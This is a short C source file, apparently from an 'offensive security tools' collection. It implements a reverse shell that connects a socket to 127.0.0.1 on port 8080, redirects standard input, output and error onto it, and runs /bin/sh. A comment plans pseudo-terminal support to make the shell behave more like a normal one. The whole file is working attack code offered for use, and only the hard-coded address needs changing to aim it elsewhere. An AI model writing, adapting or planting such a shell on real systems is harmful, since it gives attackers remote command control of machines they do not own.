/*
 * 4some - offensive security tools
 * Copyright (C) 2025 ZhestyRin
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License.
 * See <https://www.gnu.org/licenses/> for details.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

 int main() {                                           //Need to add forkpty() and openpty() for pseudo terminal so dummy shell can really act as normal shell
 
  printf("This is a reverse shell program\n");
  struct sockaddr_in addr;

   memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(8080);
 
  if(inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0) {
    perror("Invalid address");
    return 1;
  }
 
  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
   if(connect(socketfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
      perror("Connection failed");
   
   }
 
  dup2(socketfd, 0);
  dup2(socketfd, 1);
  dup2(socketfd, 2);

 char *args[] = {"/bin/sh", NULL};
 execve("/bin/sh", args, NULL);

 }









